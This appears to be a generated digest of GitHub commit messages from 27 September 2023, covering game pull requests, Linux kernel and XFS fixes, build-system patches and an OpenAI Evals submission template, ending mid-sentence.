## *good gosh*

It's so many stuff on **github**! Here's one more attempt to *get a grip*. And
an [index](docs/messages.md).

---

# [2023-09-27](docs/good-messages/2023/2023-09-27.md)


there were a lot of events recorded by [gharchive.org](https://www.gharchive.org/) of which 2,356,432 were push events containing 3,588,729 commit messages that amount to 268,702,587 characters filtered with [words.py@e23d022007...](https://github.com/defgsus/good-github/blob/e23d022007992279f9bcb3a9fd40126629d787e2/src/words.py) to these 78 messages:


## [Jacquerel/orbstation](https://github.com/Jacquerel/orbstation)@[517d33e6f0...](https://github.com/Jacquerel/orbstation/commit/517d33e6f06289085d0c6015a01c3a3ce7bc22d0)
#### Wednesday 2023-09-27 00:00:35 by Jacquerel

Basic blob mobs (#78520)

## About The Pull Request

I remembered today that blob code is ass, especially blob spores.
There's still a lot to improve but I cleaned up _some_ of it by
converting these mobs.
Now they use a newer framework and more signal handling as compared to
circular references.

I _expect_ the behaviour here to largely be the same as it was or
similar. I haven't added anything fancy or new.

This is a reasonably big PR but at least all of the files are small?
Everything here touched every other thing enough that it didnt make
sense to split up sorry.

Other things I did in code:
- Experimented with replacing the `mob/blob` subtype with a component.
Don't know if this is genius or stupid.
- AI subtree which just walks somewhere. We've used this behaviour a lot
but never given it its own subtree.
- Blob Spores and Zombies are two different mobs now instead of being
one mob which just changes every single one of its properties.
- Made a few living defence procs call super, because the only thing
super does was send a signal and we weren't doing that for no reason.
Also added a couple extra signals for intercepts we did not have.

## Changelog

:cl:
fix: Blob spores will respond to rallies more reliably (it won't runtime
every time they try and pathfind).
fix: Blobbernaut pain animation overlays should align with the direction
the mob is facing instead of always facing South
refactor: Blob spores, zombies, and blobbernauts now all use the basic
mob framework. They should work the same, but please report any issues.
/:cl:

---------

Co-authored-by: MrMelbert <51863163+MrMelbert@users.noreply.github.com>
Co-authored-by: san7890 <the@san7890.com>

---
## [TaleStation/TaleStation](https://github.com/TaleStation/TaleStation)@[b9ea70d4dd...](https://github.com/TaleStation/TaleStation/commit/b9ea70d4dd0f2575eecd3ccddce2343d11cf40db)
#### Wednesday 2023-09-27 00:03:42 by TaleStationBot

[MIRROR] [MDB IGNORE] Removes debug species from magic mirror (#7889)

Original PR: https://github.com/tgstation/tgstation/pull/78541
-----
## About The Pull Request

Tallboys strike again
Fixes #78538
Removes "Tall Boys" from the magic mirror, again.
Also gives the two fucked up monkey species names and removes _them_
from the magic mirror.
When the magic mirror was looping through available species it was
finding these monkey subtypes with fucked up limbs, noting that they
were not forbidden, then adding them to the assoc list.
Because all of them were called "monkey" it would overwrite "monkey"
with "monkey who has human arms and torso" which is... not what you
wanted to turn into.

Additionally I made external organ feature name fall back to the species
default if not provided because I kept getting a runtime on monkey tail
insertion (nobody has a monkey tail feature in their prefs or DNA) which
I originally thought was the cause of this bug, until I fixed it and
learned that actually it was something much stupider.

## Changelog

:cl:
fix: Selecting "Monkey" on a magic mirror will now once again turn you
into a Monkey rather than a disgusting freak of nature.
fix: Tall Boys have once again been barred from joining the Wizard
Federation.
/:cl:

---------

Co-authored-by: Jacquerel <hnevard@gmail.com>

---
## [TaleStation/TaleStation](https://github.com/TaleStation/TaleStation)@[169c669160...](https://github.com/TaleStation/TaleStation/commit/169c66916032b9751999d6f48049261683248826)
#### Wednesday 2023-09-27 00:03:56 by TaleStationBot

[MIRROR] [MDB IGNORE] Removes `CANPUSH` status flag from lavaland basic mobs (#7891)

Original PR: https://github.com/tgstation/tgstation/pull/78531
-----
## About The Pull Request

Title. This makes it so every lavaland mob is now unable to be pushed by
moving into them while on combat mode. Namely this helps with watchers,
as they have gained this vulnerability when they've got the basic bitch
treatment — it caused their _look away_ ability to be easily cancellable
by just pushing them. ~~you can still just fuckin' grab them to do that
and i think it's fair game~~
 
Lobsters and brimdemons are also affected, which i'm not sure how
exactly this affects their gameplay... but it is what it is.

## Why It's Good For The Game

Previous behavior restored, mobs stop being bullied by literally running
into them.

## Changelog

:cl:
fix: you can no longer push watchers (and any other lavaland basic mob)
around by running into them
/:cl:

---------

Co-authored-by: Sealed101 <cool.bullseye@yandex.ru>

---
## [diphons/D8G_Kernel_oxygen](https://github.com/diphons/D8G_Kernel_oxygen)@[6ce4621c24...](https://github.com/diphons/D8G_Kernel_oxygen/commit/6ce4621c2413544cb0aeabd54f59d65bc67ee058)
#### Wednesday 2023-09-27 00:30:23 by Johannes Weiner

mm: vmscan: fix extreme overreclaim and swap floods

commit f53af4285d775cd9a9a146fc438bd0a1bee1838a upstream.

During proactive reclaim, we sometimes observe severe overreclaim, with
several thousand times more pages reclaimed than requested.

This trace was obtained from shrink_lruvec() during such an instance:

    prio:0 anon_cost:1141521 file_cost:7767
    nr_reclaimed:4387406 nr_to_reclaim:1047 (or_factor:4190)
    nr=[7161123 345 578 1111]

While he reclaimer requested 4M, vmscan reclaimed close to 16G, most of it
by swapping.  These requests take over a minute, during which the write()
to memory.reclaim is unkillably stuck inside the kernel.

Digging into the source, this is caused by the proportional reclaim
bailout logic.  This code tries to resolve a fundamental conflict: to
reclaim roughly what was requested, while also aging all LRUs fairly and
in accordance to their size, swappiness, refault rates etc.  The way it
attempts fairness is that once the reclaim goal has been reached, it stops
scanning the LRUs with the smaller remaining scan targets, and adjusts the
remainder of the bigger LRUs according to how much of the smaller LRUs was
scanned.  It then finishes scanning that remainder regardless of the
reclaim goal.

This works fine if priority levels are low and the LRU lists are
comparable in size.  However, in this instance, the cgroup that is
targeted by proactive reclaim has almost no files left - they've already
been squeezed out by proactive reclaim earlier - and the remaining anon
pages are hot.  Anon rotations cause the priority level to drop to 0,
which results in reclaim targeting all of anon (a lot) and all of file
(almost nothing).  By the time reclaim decides to bail, it has scanned
most or all of the file target, and therefor must also scan most or all of
the enormous anon target.  This target is thousands of times larger than
the reclaim goal, thus causing the overreclaim.

The bailout code hasn't changed in years, why is this failing now?  The
most likely explanations are two other recent changes in anon reclaim:

1. Before the series starting with commit 5df741963d52 ("mm: fix LRU
   balancing effect of new transparent huge pages"), the VM was
   overall relatively reluctant to swap at all, even if swap was
   configured. This means the LRU balancing code didn't come into play
   as often as it does now, and mostly in high pressure situations
   where pronounced swap activity wouldn't be as surprising.

2. For historic reasons, shrink_lruvec() loops on the scan targets of
   all LRU lists except the active anon one, meaning it would bail if
   the only remaining pages to scan were active anon - even if there
   were a lot of them.

   Before the series starting with commit ccc5dc67340c ("mm/vmscan:
   make active/inactive ratio as 1:1 for anon lru"), most anon pages
   would live on the active LRU; the inactive one would contain only a
   handful of preselected reclaim candidates. After the series, anon
   gets aged similarly to file, and the inactive list is the default
   for new anon pages as well, making it often the much bigger list.

   As a result, the VM is now more likely to actually finish large
   anon targets than before.

Change the code such that only one SWAP_CLUSTER_MAX-sized nudge toward the
larger LRU lists is made before bailing out on a met reclaim goal.

This fixes the extreme overreclaim problem.

Fairness is more subtle and harder to evaluate.  No obvious misbehavior
was observed on the test workload, in any case.  Conceptually, fairness
should primarily be a cumulative effect from regular, lower priority
scans.  Once the VM is in trouble and needs to escalate scan targets to
make forward progress, fairness needs to take a backseat.  This is also
acknowledged by the myriad exceptions in get_scan_count().  This patch
makes fairness decrease gradually, as it keeps fairness work static over
increasing priority levels with growing scan targets.  This should make
more sense - although we may have to re-visit the exact values.

Link: https://lkml.kernel.org/r/20220802162811.39216-1-hannes@cmpxchg.org
Signed-off-by: Johannes Weiner <hannes@cmpxchg.org>
Reviewed-by: Rik van Riel <riel@surriel.com>
Acked-by: Mel Gorman <mgorman@techsingularity.net>
Cc: Hugh Dickins <hughd@google.com>
Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com>
Cc: <stable@vger.kernel.org>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
Signed-off-by: Panchajanya1999 <kernel@panchajanya.dev>
(cherry picked from commit f25b63645695424a7775571538ae8e4276bfe182)

---
## [alsoandanswer/Aurora.3](https://github.com/alsoandanswer/Aurora.3)@[faca6da739...](https://github.com/alsoandanswer/Aurora.3/commit/faca6da7397d1a2051a2edb4d17c564037a1e516)
#### Wednesday 2023-09-27 00:45:01 by Wowzewow (Wezzy)

The Food Sortening, Extra Pain-In-My-Ass Edition (#17393)

* The Food Sortening, Extra Pain-In-My-Ass Edition

Sorts all food sprites and cuts down the MONOLITH snacks.dm and food.dmi. This was an absolute pain in my ass. No front-facing changes.

Planning to add more shit down the line. Makes everyone's lives easier.

* changelol

* finally

* inhands

* merge conflict

* this really "ticked" me off HAHAHAHAHS

* fixes

* make megalinter happy

---
## [Tourte-Yaya/Paradise](https://github.com/Tourte-Yaya/Paradise)@[acb7352265...](https://github.com/Tourte-Yaya/Paradise/commit/acb735226555390c861ecf5e77bc67fd6013afe1)
#### Wednesday 2023-09-27 01:07:35 by matttheficus

Gives Vampires Stronger Night Vision at 500 Blood (#21764)

* I SEEEEEEEEEEEEE YOU

* Hal review part 1

* its time to suck at coding

* right, i think im getting somewhere

* testing shit - doesnt work

* im finally freeeeeeeeeeeeeee

* hal review 2: electric boogaloo

---
## [Ebin-Halcyon/Shiptest](https://github.com/Ebin-Halcyon/Shiptest)@[b22529fc74...](https://github.com/Ebin-Halcyon/Shiptest/commit/b22529fc74e5af32967ac91679cbce3e7e06c4ca)
#### Wednesday 2023-09-27 01:20:58 by zevo

Fixes rock sprites ingame [WHOOPS] (#2332)

<!-- Write **BELOW** The Headers and **ABOVE** The comments else it may
not be viewable. -->
<!-- You can view Contributing.MD for a detailed description of the pull
request process. -->

## About The Pull Request
Rocks were invisible in game due to a recently merged PR of mine. this
is why we testmerge PRs! anyways this should fix them.

Adds flora and rock missing texture sprites to most flora files to
prevent something like this from ever happening again.
<!-- Describe The Pull Request. Please be sure every change is
documented or this can delay review and even discourage maintainers from
merging your PR! -->

## Why It's Good For The Game
invisible things that block movement bad yeah. i want to fix my
mistakes.
<!-- Please add a short description of why you think these changes would
benefit the game. If you can't justify it in words, it might not be
worth adding. -->

## Changelog

:cl:
fix: Most rocks are now visible again
add: Most flora files now have missing texture sprites to make it easier
to spot when something has gone wrong.
/:cl:

<!-- Both :cl:'s are required for the changelog to work! You can put
your name to the right of the first :cl: if you want to overwrite your
GitHub username as author ingame. -->
<!-- You can use multiple of the same prefix (they're only used for the
icon ingame) and delete the unneeded ones. Despite some of the tags,
changelogs should generally represent how a player might be affected by
the changes rather than a summary of the PR's contents. -->

---
## [Valdrith/SwampThings](https://github.com/Valdrith/SwampThings)@[9a66746159...](https://github.com/Valdrith/SwampThings/commit/9a667461593fe7c78f01d925ad4a82cb870a4a25)
#### Wednesday 2023-09-27 01:57:11 by Valdrith@github.com

Fuck your helm release and its ignoring mount path

---
## [Coconutwarrior97/tgstation-1](https://github.com/Coconutwarrior97/tgstation-1)@[dbaae7ee1e...](https://github.com/Coconutwarrior97/tgstation-1/commit/dbaae7ee1ebe10c9f3221c78b30e4714f167a405)
#### Wednesday 2023-09-27 02:03:37 by Lufferly

Supermatter Delamination Balance Changes (Real) (#77996)

## About The Pull Request

lord forgive me I fucked up the merge conflict

The supermatter delamination countdown timer (how long it takes to go
boom-boom after hitting 0 integrity) has been lowered from 30 seconds to
13 seconds.
Removing a sliver from the supermatter, the traitor objective, will
further lower that down to 3 seconds.
Changes the wording on the mood effects from the supermatter
delaminating slightly.
The crystal uses SPAN_COMMAND on its final countdown, which means it
talk bigger.

## Why It's Good For The Game

Currently I feel that the supermatter delamination countdown overstays
its welcome. Ideally it provides tension to get the hell out, or perhaps
to make a risky last second play to try and save the supermatter.
However right now its at 30 seconds, which gives no danger of staying in
engineering right up to integrity 0, and keeps the tension at a high
note for too long, almost to the point of awkwardness. 13 seconds is a
good balance between get-the-fuck-out while still giving some leeway for
engineers to escape and crewmembers to jump in lockers, and feels quick
enough to give that danger that the supermatter should provide.
Additionally, removing a sliver from the supermatter lowers the cooldown
to 3 seconds. Right now this is one of the harder tasks a traitor can be
tasked with, while giving relatively little payoff sabatoge-wise. To the
point where I have seen engineers just let the traitor do it, as the
debuff it gives to the supermatter is minor. Now it makes the
supermatter delaminate almost immediately after hitting 0 integrity,
which means it will likely catch some engineers in the blast if a
traitor did it stealthy. This also makes it more risky to try and fix a
delamination if the engineering/security team did not stop the sliver
from being removed. All meaning succeeding at this task should be more
rewarding and damaging.
Finally the mood descriptions for the mood effects you get when a
supermatter delaminates have been changed. Currently they are pretty
gamey, and represent what the player might be thinking more than their
character. Additionally they were not very descriptive of where they
came from, which could be confusing.

## Changelog

:cl: Seven
balance: The supermatter delamination countdown has been lowered from 30
to 13 seconds
balance: Removing a sliver from the supermatter further lowers that down
to 3 seconds
balance: The supermatter crystal uses bigger text on its final countdown
spellcheck: Some supermatter delamination related mood descriptions have
been edited to explain the mood effect better
/:cl:

---------

Co-authored-by: Shadow-Quill <44811257+Shadow-Quill@users.noreply.github.com>

---
## [TheVekter/tgstation](https://github.com/TheVekter/tgstation)@[06eda01ea0...](https://github.com/TheVekter/tgstation/commit/06eda01ea08414b0574ddd84222b4de0bacf2db2)
#### Wednesday 2023-09-27 02:37:02 by carlarctg

Added the Hippocrates bust to medbay heirlooms (#78121)

## About The Pull Request

Remade from #77961 because coders dont like bloat in prs

Added the Hippocrates bust to medbay heirlooms. Paramedics don't get
one.

You can now swear the Hippocratic oath with these busts! It'll give you
pacifism but nothing else. The process is reversible.

There's a very small chance that the Hippocrates bust was once wielded
by a certain German doctor. This chance is increased for coroner
heirlooms.

## Why It's Good For The Game

> Added the Hippocrates bust to medbay heirlooms. Paramedics don't get
one.

I got this idea and I just couldn't get it out of my head, it's too
funny. Paramedics don't get one because they're powergamers and laugh at
the Oath, and also it doesn't feel like a paramedic thing.

> You can now swear the Hippocratic oath with these busts! It'll give
you pacifism but nothing else. The process is reversible.

This is just a little fun thing you can choose to do, i think it'd be
cute to see doctors swearing the oath in medbay. Plus it's reversible
which can be even funnier depending on the occassion.

> There's a very small chance that the Hippocrates bust was once wielded
by a certain German doctor. This chance is increased for coroner
heirlooms.

We DO already have precedent for references with the entrenching tool
after all. The buff isn't all that special in reality, getting a medical
hud while in your hand is... basically irrelevant for the roles that
literally spawn with a med hud? It's just for accuracy and rule of
cool's sake.

## Changelog

:cl:
add: Added the Hippocrates bust to medbay heirlooms. Paramedics don't
get one.
add: You can now swear the Hippocratic oath with these busts! It'll give
you pacifism but nothing else. The process is reversible.
add: There's a very small chance that the Hippocrates bust was once
wielded by a certain German doctor. This chance is increased for coroner
heirlooms.
/:cl:

---------

Co-authored-by: Arturlang <24881678+Arturlang@users.noreply.github.com>

---
## [rrealmuto/OoT-Randomizer](https://github.com/rrealmuto/OoT-Randomizer)@[78c6df2337...](https://github.com/rrealmuto/OoT-Randomizer/commit/78c6df23371b559b55193f5b5d12b6106b25f1e5)
#### Wednesday 2023-09-27 03:24:00 by Rob Realmuto

New flag system. Add empty/fairy pots to potsanity

Add MQ Empty/fairy pots

Shuffle empty crates/small crates

Fix nothing shop item

WIP: totally new flag system. Need to fix alt overrides, grottos items, beehives, rupee towers, shadow pot

WIP: getting there. Fixed multiple setups/rooms. Fixed alt overrides. Fix grottos. Fix beehives. Need to fix rupee towers

Fuck

Add shadow spinning pot

Make sure to clear new actor data

Make loaded_scene_room_setup uint32_t

Some code cleanup. Add comments/notes on how this shit works

Change fairy drop message

Remove unused function

Some changes to how fairy and nothing drops work from pots/crates

Fix models for duped collectibles

Should fix freestanding alt overrides not working

Add spirit temple central chamber pots to logic files

Make settings for empty pots/crates

Update to support multiworld

Move outgoing key to end of COOP_CONTEXT

WIP making junk incoming items give quicker to the player. Look into the sizing because some are coming in giant

Better draw hacks

---
## [scottming/lexical](https://github.com/scottming/lexical)@[170c5c3272...](https://github.com/scottming/lexical/commit/170c5c327289a9d087051f483e9d5df2843ef3d5)
#### Wednesday 2023-09-27 03:39:43 by Steve Cohen

Indexing features for modules (#347)

* Indexing features for modules

This commit introduces indexing for module references. It currently
will only work for files to which we have the source code, turns them
into AST and then applies one or more "extractors" on it. An extractor
runs over AST and indetifies things it's looking for, and then emits
entries, which will be used to build a searchable index.

Currently, there is one extractor implemented: Module references. This
does a fairly exhaustive search for module references, wherever
they're hiding. It then uses the aliases module to find the original
source module.

Note that most of the higher level functions are just placeholders. An
indexing strategy needs to find things inside of .exs files as well as
.ex files, and we currently have no way to index core elixir (this
will be highly dependent on how elixir was installed and if we can get
the source code to the version we're running on).

* Performance fixes / code improvements

Turns out `Aliases.at()` was super slow --especially since we called
it so much when resolving aliases during indexing. This was due to it
having to re-parse the document multiple times for each alias
reference. Moving to sourceror and allowing the AST to be sent in cut
the indexing time for lexical and all its deps from 60 seconds to 10.


* ETS based storage / Fuzzy matching

This commit has ETS based file storage and a fuzzy matching system.
I was having a lot of trouble coming up with an efficient way to perform
fuzzy matching against a corpous of subjects efficiently using the data
stores. ETS is... ets, and it appears that it's impossible to use it for
any type of detailed string matching. SQLite had similar problems. While
it had a lot more complicated and helpful utilities, it just couldn't do
what I wanted when it comes to fuzziness.

Then I thought, hey, why not just store the subjects in memory with all
the places that they appear? Then you just keep that up to date, and you
remove a lot of duplication, which improves performance a lot.

Prior to this, ETS was taking around 300ms to do simple-ish matching,
and SQLite was taking around 180ms. Fuzzy can do it in 14ms. Better yet,
building a fuzzy from scratch only takes 40ms for lexical and all its
deps. This includes doing much more interesting matching.

I think we have a winner.

---
## [lgirdk/openembedded-core](https://github.com/lgirdk/openembedded-core)@[909fd25c2e...](https://github.com/lgirdk/openembedded-core/commit/909fd25c2ebd25f5d3bc560e26f9df6862e033d0)
#### Wednesday 2023-09-27 04:40:23 by Richard Purdie

pseudo: Fix to work with glibc 2.38

This adds a horrible hack to get pseudo working with glibc 2.38. We can't
drop _GNU_SOURCE to something like _DEFAULT_SOURCE since we need the defines
the gnu options bring in. That leaves using internal glibc defines to disable
the c23 versions of strtol/fscanf and friends. Which would break pseudo
build with 2.38 from running on hosts with older glibc.

We'll probably need to come up with something better but this gets glibc 2.38
and working and avoids autobuilder failures.

Signed-off-by: Richard Purdie <richard.purdie@linuxfoundation.org>
(cherry picked from commit 596fb699d470d7779bfa694e04908929ffeabcf7)
Signed-off-by: Steve Sakoman <steve@sakoman.com>

---
## [lgirdk/poky](https://github.com/lgirdk/poky)@[4682ae38f2...](https://github.com/lgirdk/poky/commit/4682ae38f285f59b68196289ece5802460805201)
#### Wednesday 2023-09-27 04:40:24 by Richard Purdie

pseudo: Fix to work with glibc 2.38

This adds a horrible hack to get pseudo working with glibc 2.38. We can't
drop _GNU_SOURCE to something like _DEFAULT_SOURCE since we need the defines
the gnu options bring in. That leaves using internal glibc defines to disable
the c23 versions of strtol/fscanf and friends. Which would break pseudo
build with 2.38 from running on hosts with older glibc.

We'll probably need to come up with something better but this gets glibc 2.38
and working and avoids autobuilder failures.

(From OE-Core rev: 909fd25c2ebd25f5d3bc560e26f9df6862e033d0)

Signed-off-by: Richard Purdie <richard.purdie@linuxfoundation.org>
(cherry picked from commit 596fb699d470d7779bfa694e04908929ffeabcf7)
Signed-off-by: Steve Sakoman <steve@sakoman.com>

---
## [77Pankaj/77Pankaj](https://github.com/77Pankaj/77Pankaj)@[6abe010e83...](https://github.com/77Pankaj/77Pankaj/commit/6abe010e8334cfa713fc92f3bd80fe28538f2f4b)
#### Wednesday 2023-09-27 04:44:46 by 77Pankaj

Yeah, It's a Beautiful Day!

Always enthusiastic to learn new things that contribute in development of Science and technology . Information based action and insights observations are my hobby. Using Python and tableau findings can be represented in as well organized and attractive as easily understanding ways. Analytical behavior with understanding niche perspective gains confidence that fruitfully triggered to achieve more and more towards the real results. Findings that can help to take Decision which definitely convert confusion to confidence when features are provided. Artificial solutions also can be gain from the respective markets experience without paying a single penny which can truly become helpful for startups and new entrepreneurship. Having interest in Analytical and Hypothetical domain makes me to fly and play with the data easily. Enthusiastic to new learnings which can boost and provide edge to my interest.

---
## [sm8450-mainline/linux](https://github.com/sm8450-mainline/linux)@[3c919b0910...](https://github.com/sm8450-mainline/linux/commit/3c919b0910906cc69d76dea214776f0eac73358b)
#### Wednesday 2023-09-27 04:51:37 by Darrick J. Wong

xfs: reserve less log space when recovering log intent items

Wengang Wang reports that a customer's system was running a number of
truncate operations on a filesystem with a very small log.  Contention
on the reserve heads lead to other threads stalling on smaller updates
(e.g.  mtime updates) long enough to result in the node being rebooted
on account of the lack of responsivenes.  The node failed to recover
because log recovery of an EFI became stuck waiting for a grant of
reserve space.  From Wengang's report:

"For the file deletion, log bytes are reserved basing on
xfs_mount->tr_itruncate which is:

    tr_logres = 175488,
    tr_logcount = 2,
    tr_logflags = XFS_TRANS_PERM_LOG_RES,

"You see it's a permanent log reservation with two log operations (two
transactions in rolling mode).  After calculation (xlog_calc_unit_res()
adds space for various log headers), the final log space needed per
transaction changes from  175488 to 180208 bytes.  So the total log
space needed is 360416 bytes (180208 * 2).  [That quantity] of log space
(360416 bytes) needs to be reserved for both run time inode removing
(xfs_inactive_truncate()) and EFI recover (xfs_efi_item_recover())."

In other words, runtime pre-reserves 360K of space in anticipation of
running a chain of two transactions in which each transaction gets a
180K reservation.

Now that we've allocated the transaction, we delete the bmap mapping,
log an EFI to free the space, and roll the transaction as part of
finishing the deferops chain.  Rolling creates a new xfs_trans which
shares its ticket with the old transaction.  Next, xfs_trans_roll calls
__xfs_trans_commit with regrant == true, which calls xlog_cil_commit
with the same regrant parameter.

xlog_cil_commit calls xfs_log_ticket_regrant, which decrements t_cnt and
subtracts t_curr_res from the reservation and write heads.

If the filesystem is fresh and the first transaction only used (say)
20K, then t_curr_res will be 160K, and we give that much reservation
back to the reservation head.  Or if the file is really fragmented and
the first transaction actually uses 170K, then t_curr_res will be 10K,
and that's what we give back to the reservation.

Having done that, we're now headed into the second transaction with an
EFI and 180K of reservation.  Other threads apparently consumed all the
reservation for smaller transactions, such as timestamp updates.

Now let's say the first transaction gets written to disk and we crash
without ever completing the second transaction.  Now we remount the fs,
log recovery finds the unfinished EFI, and calls xfs_efi_recover to
finish the EFI.  However, xfs_efi_recover starts a new tr_itruncate
tranasction, which asks for 360K log reservation.  This is a lot more
than the 180K that we had reserved at the time of the crash.  If the
first EFI to be recovered is also pinning the tail of the log, we will
be unable to free any space in the log, and recovery livelocks.

Wengang confirmed this:

"Now we have the second transaction which has 180208 log bytes reserved
too. The second transaction is supposed to process intents including
extent freeing.  With my hacking patch, I blocked the extent freeing 5
hours. So in that 5 hours, 180208 (NOT 360416) log bytes are reserved.

"With my test case, other transactions (update timestamps) then happen.
As my hacking patch pins the journal tail, those timestamp-updating
transactions finally use up (almost) all the left available log space
(in memory in on disk).  And finally the on disk (and in memory)
available log space goes down near to 180208 bytes.  Those 180208 bytes
are reserved by [the] second (extent-free) transaction [in the chain]."

Wengang and I noticed that EFI recovery starts a transaction, completes
one step of the chain, and commits the transaction without completing
any other steps of the chain.  Those subsequent steps are completed by
xlog_finish_defer_ops, which allocates yet another transaction to
finish the rest of the chain.  That transaction gets the same tr_logres
as the head transaction, but with tr_logcount = 1 to force regranting
with every roll to avoid livelocks.

In other words, we already figured this out in commit 929b92f64048d
("xfs: xfs_defer_capture should absorb remaining transaction
reservation"), but should have applied that logic to each intent item's
recovery function.  For Wengang's case, the xfs_trans_alloc call in the
EFI recovery function should only be asking for a single transaction's
worth of log reservation -- 180K, not 360K.

Quoting Wengang again:

"With log recovery, during EFI recovery, we use tr_itruncate again to
reserve two transactions that needs 360416 log bytes.  Reserving 360416
bytes fails [stalls] because we now only have about 180208 available.

"Actually during the EFI recover, we only need one transaction to free
the extents just like the 2nd transaction at RUNTIME.  So it only needs
to reserve 180208 rather than 360416 bytes.  We have (a bit) more than
180208 available log bytes on disk, so [if we decrease the reservation
to 180K] the reservation goes and the recovery [finishes].  That is to
say: we can fix the log recover part to fix the issue. We can introduce
a new xfs_trans_res xfs_mount->tr_ext_free

{
  tr_logres = 175488,
  tr_logcount = 0,
  tr_logflags = 0,
}

"and use tr_ext_free instead of tr_itruncate in EFI recover."

However, I don't think it quite makes sense to create an entirely new
transaction reservation type to handle single-stepping during log
recovery.  Instead, we should copy the transaction reservation
information in the xfs_mount, change tr_logcount to 1, and pass that
into xfs_trans_alloc.  We know this won't risk changing the min log size
computation since we always ask for a fraction of the reservation for
all known transaction types.

This looks like it's been lurking in the codebase since commit
3d3c8b5222b92, which changed the xfs_trans_reserve call in
xlog_recover_process_efi to use the tr_logcount in tr_itruncate.
That changed the EFI recovery transaction from making a
non-XFS_TRANS_PERM_LOG_RES request for one transaction's worth of log
space to a XFS_TRANS_PERM_LOG_RES request for two transactions worth.

Fixes: 3d3c8b5222b92 ("xfs: refactor xfs_trans_reserve() interface")
Complements: 929b92f64048d ("xfs: xfs_defer_capture should absorb remaining transaction reservation")
Suggested-by: Wengang Wang <wen.gang.wang@oracle.com>
Cc: Srikanth C S <srikanth.c.s@oracle.com>
[djwong: apply the same transformation to all log intent recovery]
Signed-off-by: Darrick J. Wong <djwong@kernel.org>
Reviewed-by: Dave Chinner <dchinner@redhat.com>

---
## [ido777/evals](https://github.com/ido777/evals)@[170dfd886c...](https://github.com/ido777/evals/commit/170dfd886c0704588461af075393cc20cfb0480f)
#### Wednesday 2023-09-27 05:04:57 by Robert Bateman

[Eval] An array of Liar Paradox-based evals (#883)

# Thank you for contributing an eval! ♥️

🚨 Please make sure your PR follows these guidelines, __failure to follow
the guidelines below will result in the PR being closed automatically__.
Note that even if the criteria are met, that does not guarantee the PR
will be merged nor GPT-4 access granted. 🚨

__PLEASE READ THIS__:

In order for a PR to be merged, it must fail on GPT-4. We are aware that
right now, users do not have access, so you will not be able to tell if
the eval fails or not. Please run your eval with GPT-3.5-Turbo, but keep
in mind as we run the eval, if GPT-4 gets higher than 90% on the eval,
we will likely reject since GPT-4 is already capable of completing the
task.

We plan to roll out a way for users submitting evals to see the eval
performance on GPT-4 soon. Stay tuned! Until then, you will not be able
to see the eval performance on GPT-4. **Starting April 10, the minimum
eval count is 15 samples, we hope this makes it easier to create and
contribute evals.**

## Eval details 📑
### Eval name
logic-liar-paradox

### Eval description

An array of Liar Paradox-based evals, examining the model's proficiency
in navigating linguistic nuances and logical reasoning within
self-referential statements.

### What makes this a useful eval?

This eval is particularly useful because it delves into complex, nuanced
logical concepts and self-referential statements, which have
historically posed challenges for AI models. By exploring various
contexts, alternative logical frameworks, and modifications to
statements, this eval helps assess the model's ability to adapt to
different perspectives, grasp subtleties in language, and engage in
flexible reasoning. The ability to understand and navigate paradoxes is
an essential aspect of human-like reasoning, and improving an AI model's
performance in this area would significantly enhance its overall
usefulness and reliability in real-world applications. Additionally,
showcasing the model's improved proficiency in handling paradoxes would
not only make for a compelling marketing angle (as paradoxes are
understood by a much broader range of people than other difficult tasks
such as pure maths or quantum mechanics) but it would also demonstrate
the progress made in AI's capacity to think and reason more like humans.
It also adds paradox-absorbing crumple zones.

## Criteria for a good eval ✅

Below are some of the criteria we look for in a good eval. In general,
we are seeking cases where the model does not do a good job despite
being capable of generating a good response (note that there are some
things large language models cannot do, so those would not make good
evals).

Your eval should be:

- [x] Thematically consistent: The eval should be thematically
consistent. We'd like to see a number of prompts all demonstrating some
particular failure mode. For example, we can create an eval on cases
where the model fails to reason about the physical world.
- [x] Contains failures where a human can do the task, but either GPT-4
or GPT-3.5-Turbo could not.
- [x] Includes good signal around what is the right behavior. This means
either a correct answer for `Basic` evals or the `Fact` Model-graded
eval, or an exhaustive rubric for evaluating answers for the `Criteria`
Model-graded eval.
- [x] **Include at least 15 high quality examples.**

If there is anything else that makes your eval worth including, please
document it below.

- [x] Addresses complex logical reasoning: The eval focuses on AI's
ability to comprehend and navigate paradoxes, self-referential
statements, and context switching, which are important aspects of
human-like reasoning. By testing the model's proficiency in these areas,
we can identify areas for improvement and work towards enhancing AI's
overall capacity to think and reason more like humans.
- [x] Demonstrates adaptability and flexibility: The eval showcases the
model's ability to switch between contexts, alter premises, and engage
with different dimensions of inferred logic. This will help assess the
model's adaptability and flexibility in diverse real-world situations,
making it more reliable and useful.
- [x] Contributes to AI safety and understanding: By identifying the
model's weaknesses and limitations in handling paradoxes and complex
logical constructs, the eval can contribute to AI safety and enable
researchers to better understand the challenges faced by large language
models in these areas.
- [x] Engaging and appealing: An eval that delves into paradoxes and
complex thought exercises is not only intellectually stimulating but
also adds an appealing element to showcase the model's capabilities,
making it more attractive for both researchers and end-users.

### Unique eval value

- [x] Encourages creativity and lateral thinking: The eval, by focusing
on paradoxes and complex logical constructs, encourages both the AI and
its developers to think creatively and approach problem-solving from
unconventional angles. This can lead to the discovery of novel solutions
and a better understanding of the model's capabilities.
- [x] Aligns with human values and expectations: An AI that can
successfully navigate paradoxes and complex logic is more likely to
align with human values and expectations. By addressing these challenges
in the eval, we strive to develop AI systems that understand and respect
the nuances of human thought and communication.
- [x] Addresses a broad range of applications: Improved reasoning and
context-switching abilities can have a significant impact on various AI
applications, including natural language understanding, decision-making,
and problem-solving in domains such as law, philosophy, ethics, and
more.
- [x] Fosters interdisciplinary collaboration: The exploration of
paradoxes and complex logic often draws upon insights from multiple
disciplines, including philosophy, linguistics, psychology, and computer
science. This eval can help foster interdisciplinary collaboration,
leading to richer and more diverse perspectives on AI development and
its potential impact on society.

## Eval structure 🏗️

Your eval should
- [x] Check that your data is in `evals/registry/data/{name}`
- [x] Check that your yaml is registered at
`evals/registry/evals/{name}.yaml`
- [x] Ensure you have the right to use the data you submit via this eval

(For now, we will only be approving evals that use one of the existing
eval classes. You may still write custom eval classes for your own
cases, and we may consider merging them in the future.)

## Final checklist 👀

### Submission agreement

By contributing to Evals, you are agreeing to make your evaluation logic
and data under the same MIT license as this repository. You must have
adequate rights to upload any data used in an Eval. OpenAI reserves the
right to use this data in future service improvements to our product.
Contributions to OpenAI Evals will be subject to our usual Usage
